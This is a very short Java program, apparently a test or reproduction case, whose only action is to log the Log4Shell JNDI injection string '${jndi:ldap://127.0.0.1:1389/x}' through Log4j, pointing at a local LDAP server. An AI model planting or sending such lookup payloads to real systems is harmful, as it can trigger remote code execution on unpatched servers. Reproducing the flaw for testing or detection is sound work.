package seta.log4j.p10;

public final class App {
    private App() {
    }

    public static void main(String[] args) throws Exception {
        org.apache.logging.log4j.LogManager.getLogger(App.class).error("${jndi:ldap://127.0.0.1:1389/x}");
    }
}
